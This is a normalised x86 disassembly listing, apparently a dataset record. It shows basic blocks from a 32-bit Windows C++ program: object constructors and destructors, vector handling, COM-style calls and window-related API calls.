mov edx [ eax + 0x38 ]
push 0x1
mov ecx esi
call edx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x40 ] 0x6
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0x1c ]
push edx
push r--data
push eax
mov eax [ ecx + 0x90 ]
call eax
mov eax [ esp + 0x1c ]
cmp eax ebx
je r-xdata
inc esi
cmp esi [ esp + 0x24 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x40 ] 0x8
mov eax [ esp + 0x18 ]
push eax
call [ SysFreeString@IAT ]
mov edx [ esp + 0x10 ]
push edx
call sub_428610
cmp eax [ ebp + 0x10 ]
je r-xdata
mov [ esp + 0x10 ] ebx
mov [ esp + 0x40 ] 0x8
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
lea edx [ esp + 0x10 ]
push edx
push esi
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp [ esp + 0x10 ] ebx
je r-xdata
jmp r-xdata
lea eax [ esp + 0x2c ]
push eax
call sub_402d40
mov [ esp + 0x40 ] 0xa
mov ecx [ esp + 0x18 ]
mov edx [ ebp + 0x18 ]
push ecx
push edx
push r--data
lea edi [ esp + 0x38 ]
call sub_401dc0
mov esi [ esp + 0x3c ]
mov eax [ esi + 0x4 ]
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push 0x0
push esi
push ecx
mov ecx [ esp + 0x1c ]
push edx
push ecx
push eax
call sub_4232c0
mov eax [ ebp + 0xc ]
jmp r-xdata
mov [ esp + 0x40 ] 0x9
lea ecx [ esp + 0x2c ]
call sub_402ca0
mov [ esp + 0x40 ] 0x8
mov eax [ esp + 0x18 ]
push eax
call [ SysFreeString@IAT ]
mov [ esp + 0x40 ] 0x6
lea ecx [ esp + 0x10 ]
push ecx
call sub_40a500
cmp [ esi + 0x8 ] 0x0
je r-xdata
test eax eax
je r-xdata
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x2c ]
push edx
mov edx [ esp + 0x14 ]
push ecx
mov ecx [ ebp + 0x8 ]
push eax
push edx
call sub_422f60
sub_425e70
mov eax [ edi + 0xc0 ]
mov ecx [ edi + 0xc4 ]
cmp eax ecx
je r-xdata
retn
push esi
mov edx [ edi + 0xc4 ]
lea ecx [ eax + 0x4 ]
sub edx ecx
sar edx 0x2
add edx edx
add edx edx
push edx
push ecx
push eax
call [ memmove@IAT ]
add [ edi + 0xc4 ] 0xfffffffc
add esp 0xc
push esi
call sub_4259b0
pop esi
add eax 0x4
cmp eax ecx
jne r-xdata
mov esi [ eax ]
cmp [ esi + 0x4 ] edx
je r-xdata
pop esi
retn
sub_425ec0
push ebx
push edi
mov edi ecx
mov eax [ edi + 0xc4 ]
sub eax [ edi + 0xc0 ]
xor ebx ebx
sar eax 0x2
test eax eax
je r-xdata
pop edi
pop ebx
retn
push esi
lea ebx [ ebx ]
mov eax [ edi + 0xc4 ]
sub eax [ edi + 0xc0 ]
inc ebx
sar eax 0x2
cmp ebx eax
jb r-xdata
mov eax [ esi + 0x8 ]
xor ecx ecx
cmp [ eax - 0xc ] ecx
je r-xdata
mov ecx [ edi + 0xc0 ]
mov esi [ ecx + ebx * 4 ]
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x58 ]
call eax
mov ecx [ esi + 0x4 ]
mov edx [ eax ]
mov edx [ edx + 0x4c ]
push ecx
mov ecx eax
call edx
test eax eax
je r-xdata
pop esi
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x10 ]
push eax
mov eax [ esi + 0xc ]
push edx
mov edx [ esi ]
push eax
push ecx
mov ecx [ esi + 0x4 ]
push ecx
push edx
push edi
call sub_425a50
mov ecx eax
sub_425f80
push ebp
mov ebp esp
push 0xffffffff
push sub_449c1e
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_422260
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x40 ] r--data
mov [ esi + 0xc0 ] eax
mov [ esi + 0xc4 ] eax
mov [ esi + 0xc8 ] eax
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x40 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_426020
push ebp
mov ebp esp
push 0xffffffff
push sub_449bd8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x40 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_425840
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4260a0
push ebp
mov ebp esp
push 0xffffffff
push sub_449ba8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov [ ecx + 0x14 ] r--data
mov [ ecx + 0x34 ] r--data
mov [ ecx + 0x40 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_425840
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_426100
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44be78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x14 ] ecx
mov eax [ ebp + 0x1c ]
mov esi [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov ebx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push esi
push edx
mov edx [ ebp + 0x8 ]
push ebx
push eax
push edx
call sub_423a40
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esp + 0x10 ] eax
mov [ esp + 0x30 ] 0x1
push r--data
push ebx
lea edi [ esp + 0x18 ]
mov [ esi + 0x1a4 ] 0x0
call sub_428960
mov edi [ esp + 0x10 ]
push r--data
push edi
call [ StrStrIW@IAT ]
test eax eax
je r-xdata
push r--data
push edi
call [ StrStrIW@IAT ]
test eax eax
je r-xdata
or [ esi + 0x1a4 ] 0x20000
push r--data
lea edi [ esi + 0x58 ]
push ebx
call sub_428960
mov edi [ edi ]
mov eax [ esp + 0x14 ]
push edi
push eax
lea ecx [ esp + 0x1c ]
call sub_428d70
mov ecx [ eax ]
mov [ esi + 0x48 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4c ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x50 ] ecx
mov edx [ eax + 0xc ]
lea eax [ esi + 0x70 ]
push eax
push r--data
push ebx
mov [ esi + 0x54 ] edx
call sub_428a20
push 0x1
push r--data
push r--data
push ebx
call sub_428790
test al al
sete cl
xor eax eax
push ebx
lea ebx [ esp + 0x18 ]
mov [ esi + 0x19 ] cl
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
call sub_428af0
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov [ esi + 0x198 ] edx
mov [ esi + 0x19c ] eax
mov [ esp + 0x30 ] 0xffffffff
mov eax [ esp + 0x10 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
or [ esi + 0x1a4 ] 0x10000
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4262b0
push ebp
mov ebp esp
push 0xffffffff
push sub_448688
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_42b6c0
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov eax 0x5
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov al 0x1
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x24 ] al
mov [ esi + 0x29 ] 0x101
mov [ esi + 0x15c ] ecx
mov [ esi + 0x160 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_426340
push ebp
mov ebp esp
push 0xffffffff
push sub_448658
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_42b7c0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4263e0
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push 0x0
call edx
mov esi [ edi + 0x78 ]
sub esi [ edi + 0x74 ]
xor ebx ebx
sar esi 0x2
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn 0x4
lea ecx [ ecx ]
inc ebx
cmp ebx esi
jl r-xdata
cmp [ ecx + 0x14 ] 0x1
je r-xdata
mov eax [ edi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0x69 ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x0
call eax
sub_426430
push esi
push edi
mov esi ecx
push 0x0
lea edi [ esi + 0x30 ]
push edi
push 0x0
push 0x30
call [ SystemParametersInfoW@IAT ]
mov eax [ edi ]
mov ecx [ edi + 0x4 ]
mov edx [ edi + 0x8 ]
mov [ esi + 0x40 ] eax
mov eax [ edi + 0xc ]
mov [ esi + 0x44 ] ecx
mov ecx [ edi ]
mov [ esi + 0x48 ] edx
mov edx [ edi + 0x4 ]
mov [ esi + 0x50 ] ecx
mov ecx [ edi + 0xc ]
mov [ esi + 0x4c ] eax
mov eax [ edi + 0x8 ]
mov [ esi + 0x54 ] edx
mov edx [ esi ]
mov [ esi + 0x58 ] eax
mov eax [ edx + 0x64 ]
mov [ esi + 0x5c ] ecx
mov ecx esi
call eax
mov al 0x1
pop edi
mov [ esi + 0x25 ] al
pop esi
retn 0x4
sub_4264b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x78 ]
sub ebx [ esi + 0x74 ]
xor eax eax
sar ebx 0x2
push edi
mov [ ebp - 0x4 ] eax
test ebx ebx
jle r-xdata
mov ecx [ esi + 0x78 ]
mov edi [ esi + 0x74 ]
cmp edi ecx
je r-xdata
jmp r-xdata
mov ecx [ esi + 0x15c ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
mov ecx [ esi + 0x15c ]
xor edi edi
cmp ecx edi
je r-xdata
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call [ memmove@IAT ]
add esp 0xc
add ebx edi
mov [ esi + 0x78 ] ebx
mov ecx [ esi + 0x74 ]
mov edi [ ecx + eax * 4 ]
test edi edi
je r-xdata
lea ecx [ esi + 0x70 ]
push ecx
mov [ esi + 0x15c ] edi
call sub_412c20
mov ecx [ esi + 0x4 ]
cmp ecx edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
inc eax
mov [ ebp - 0x4 ] eax
cmp eax ebx
jl r-xdata
cmp edi [ esi + 0x15c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ esi + 0x4 ] edi
mov edx [ edi ]
mov eax [ edx + 0x10 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
mov eax [ ebp - 0x4 ]
sub_426580
push ebx
mov ebx ecx
cmp [ ebx + 0x160 ] 0x0
jne r-xdata
pop ebx
retn
push esi
mov [ ebx + 0x160 ] 0x1
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
jmp r-xdata
mov eax [ ebx + 0x74 ]
mov ecx [ eax + edi * 4 ]
cmp [ ecx + 0xc ] 0x6
je r-xdata
inc edi
cmp edi esi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x1c ]
call eax
sub_4265d0
push ebx
push esi
mov ebx ecx
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov ecx [ eax + edi * 4 ]
cmp [ ecx + 0xc ] 0x6
je r-xdata
inc edi
cmp edi esi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
call eax
sub_426600
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ ecx + 0x78 ]
sub edi [ ecx + 0x74 ]
xor ebx ebx
sar edi 0x2
mov [ ebp - 0x4 ] ecx
test edi edi
jle r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esp [ esp ]
inc ebx
cmp ebx edi
jl r-xdata
cmp [ esi + 0x10 ] 0x2
jne r-xdata
mov eax [ ecx + 0x74 ]
mov esi [ eax + ebx * 4 ]
cmp [ esi + 0xc ] 0x6
je r-xdata
pop esi
mov edx [ esi ]
mov eax [ edx + 0x48 ]
mov ecx esi
call eax
mov ecx [ ebp - 0x4 ]
mov edx [ esi ]
mov eax [ edx + 0x74 ]
mov ecx esi
call eax
test al al
je r-xdata
mov ecx [ esi + 0x60 ]
push 0x0
push ecx
call [ ShowWindow@IAT ]
sub_426670
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
push ebx
mov ebx ecx
push esi
mov [ ebx + 0x2a ] al
mov esi [ ebx + 0x78 ]
sub esi [ ebx + 0x74 ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
lea ecx [ ecx ]
inc edi
cmp edi esi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov ecx [ ebx + 0x74 ]
mov ecx [ ecx + edi * 4 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x6
je r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x38 ]
push eax
call edx
sub_4266c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x25 ] 0x0
jne r-xdata
mov eax 0x1
pop ebp
retn 0x4
sub_426720
push ebp
mov ebp esp
push 0xffffffff
push sub_445d5b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
mov edi [ operator delete@IAT ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
je r-xdata
push eax
call edi
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call edi
add esp 0x4
sub_4267a0
push ebp
mov ebp esp
push 0xffffffff
push sub_445dda
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi ecx
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x4 ]
xor edx edx
sar eax 0x2
test eax eax
jle r-xdata
mov eax [ esi + 0x8 ]
lea ecx [ ebp + 0x8 ]
cmp ecx eax
jae r-xdata
mov edi [ esi + 0x4 ]
mov ecx [ esi + 0xc ]
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x4 ]
cmp edx ecx
ja r-xdata
inc edx
add edi 0x4
cmp edx eax
jl r-xdata
mov ecx [ ecx + 0x8 ]
cmp ecx [ ebx + 0x8 ]
je r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov edx [ esi + 0x4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edi ecx
mov ecx [ esi + 0xc ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
add [ esi + 0x8 ] 0x4
mov [ eax ] ebx
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call [ std::_Xlength_error@IAT ]
mov edx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
lea edi [ edx + edi * 4 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
jae r-xdata
mov ecx [ edi ]
mov [ eax ] ecx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call [ std::_Xlength_error@IAT ]
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
push ecx
lea ecx [ esi + 0x4 ]
call sub_413590
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
lea ecx [ esi + 0x4 ]
call sub_413590
mov ecx eax
cmp ecx eax
jae r-xdata
sub_426900
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_445d28
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
lea eax [ esp + 0x14 ]
xor ebx ebx
add ecx 0x4
push eax
mov [ esp + 0x14 ] ebx
call sub_426a60
mov [ esp + 0x30 ] ebx
mov edi [ esp + 0x18 ]
sub edi [ esp + 0x14 ]
sar edi 0x2
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ esp + 0x14 ]
mov esi [ ecx + ebx * 4 ]
test esi esi
je r-xdata
mov [ esp + 0x30 ] 0xffffffff
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jle r-xdata
inc ebx
cmp ebx edi
jl r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
push eax
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ esp + 0x14 ]
mov esi [ ecx + ebx * 4 ]
test esi esi
je r-xdata
xor ebx ebx
mov edx [ esi ]
mov eax [ edx + 0x74 ]
mov ecx esi
call eax
test al al
je r-xdata
inc ebx
cmp ebx edi
jl r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x64 ] 0x0
jne r-xdata
xor ebx ebx
mov edx [ esi ]
mov eax [ edx + 0x74 ]
mov ecx esi
call eax
test al al
je r-xdata
cmp [ esi + 0xc ] 0x10
je r-xdata
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x5c ]
mov ecx esi
call eax
test eax eax
je r-xdata
cmp [ esi + 0xc ] 0x10
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ eax ]
mov edx [ edx + 0x4 ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx eax
call edx
mov [ esp + 0x10 ] eax
mov edx [ esi ]
mov eax [ edx + 0x5c ]
mov ecx esi
call eax
test eax eax
je r-xdata
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov edx [ eax ]
mov edx [ edx + 0x4 ]
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx eax
call edx
cmp [ esi ] 0x0
mov [ esp + 0x10 ] eax
jne r-xdata
sub_426a60
push ebp
mov ebp esp
push 0xffffffff
push sub_445d00
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov edi [ ebx + 0x4 ]
sub edi [ ebx ]
sar edi 0x2
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0x3fffffff
jbe r-xdata
mov ecx edi
call sub_4138d0
mov [ esi ] eax
mov [ esi + 0x4 ] eax
lea eax [ eax + edi * 4 ]
mov [ esi + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov ebx [ ebx ]
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
push edx
push ecx
push eax
push ebx
call sub_426b20
add esp 0x10
mov [ esi + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
push r--data
call [ std::_Xlength_error@IAT ]
sub_426b20
push ebp
mov ebp esp
push 0xffffffff
push sub_445ce5
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov dl 0x1
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] dl
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] bl
add eax 0x4
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x8 ]
add ecx 0x4
mov [ ebp + 0x8 ] ecx
jmp r-xdata
mov ecx [ ecx ]
mov [ eax ] ecx
cmp ecx [ ebp + 0xc ]
je r-xdata
sub_426ba0
push ebp
mov ebp esp
push 0xffffffff
push sub_4450a3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_426c20
push ebp
mov ebp esp
push 0xffffffff
push sub_445073
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov [ ecx + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ ecx + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_426ca0
push esi
mov esi ecx
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push ecx
mov ecx esi
call edx
mov eax [ rw-data ]
mov ecx [ eax + 0x44 ]
mov eax [ esi + 0x18 ]
mov edx [ ecx ]
mov edx [ edx + 0xc ]
push eax
push esi
call edx
pop esi
retn 0x4
sub_426cd0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
jne r-xdata
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx esi
call edx
test al al
je r-xdata
xor al al
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x25 ] 0x0
jne r-xdata
mov al 0x1
mov [ esi + 0x25 ] al
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax [ esi + 0x70 ]
mov edx [ eax + 0x8 ]
lea ecx [ esi + 0x70 ]
call edx
sub_426d20
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov al [ ebp + 0x8 ]
mov [ esi + 0x26 ] al
test al al
jne r-xdata
xor al al
pop esi
pop ebp
retn 0x4
mov ecx [ esi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x64 ]
call edx
test eax eax
je r-xdata
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x44 ]
push esi
call edx
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x24 ]
push esi
call edx
mov al 0x1
pop esi
pop ebp
retn 0x4
mov ecx [ esi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push 0xe
push 0x1
call edx
mov al 0x1
pop esi
pop ebp
retn 0x4
sub_426d80
mov eax ecx
cmp [ eax + 0x24 ] 0x0
je r-xdata
retn 0x8
cmp [ eax + 0x25 ] 0x0
je r-xdata
cmp [ eax + 0x26 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
cmp [ edx + 0xab ] 0x0
mov ecx [ eax + 0x1c ]
push esi
mov esi [ ecx ]
sete dl
movzx edx dl
push 0x0
push edx
push eax
mov eax [ esi + 0x20 ]
call eax
pop esi
sub_426dd0
cmp [ eax + 0x24 ] 0x0
je r-xdata
retn
cmp [ eax + 0x25 ] 0x0
je r-xdata
cmp [ eax + 0x26 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
cmp [ edx + 0xab ] 0x0
mov ecx [ eax + 0x1c ]
push esi
mov esi [ ecx ]
sete dl
movzx edx dl
push 0x0
push edx
push eax
mov eax [ esi + 0x20 ]
call eax
pop esi
sub_426e10
push ebp
mov ebp esp
mov eax ecx
cmp [ eax + 0x24 ] 0x0
mov cl [ ebp + 0x8 ]
mov [ eax + 0x27 ] cl
je r-xdata
pop ebp
retn 0x4
cmp [ eax + 0x25 ] 0x0
je r-xdata
cmp [ eax + 0x26 ] 0x0
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ eax + 0x4 ]
test edx edx
